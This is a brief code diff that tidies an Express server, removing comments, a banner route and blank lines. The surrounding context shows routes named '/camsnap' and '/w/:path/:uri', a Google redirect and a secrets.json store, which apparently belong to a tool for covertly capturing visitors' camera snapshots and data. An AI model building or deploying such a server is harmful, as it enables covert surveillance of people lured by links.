@@ -17,15 +17,6 @@ const loadSecrets = () => {
   return {};
 };
 
-
-
-
-// const exp = express();
-
-// exp.get("/", (req, res) => res.send("Express on Vercel"));
-
-
-
 const saveSecrets = () => {
   fs.writeFileSync("secrets.json", JSON.stringify(userSecrets, null, 2));
 };
@@ -174,9 +165,6 @@ app.get("/w/:path/:uri", (req, res) => {
   } else {
     res.redirect("https://www.google.com/");
   }
-});
-app.get("/", function (req, res) {
-  res.send('<h1 align="center">Karna Server Activated GK</h1>');
 });
 
 app.get("/c/:path/:uri", (req, res) => {
@@ -349,7 +337,3 @@ app.post("/camsnap", (req, res) => {
 app.listen(5000, () => {
   console.log("App Running on Port 5000!");
 });
-
-
-
-
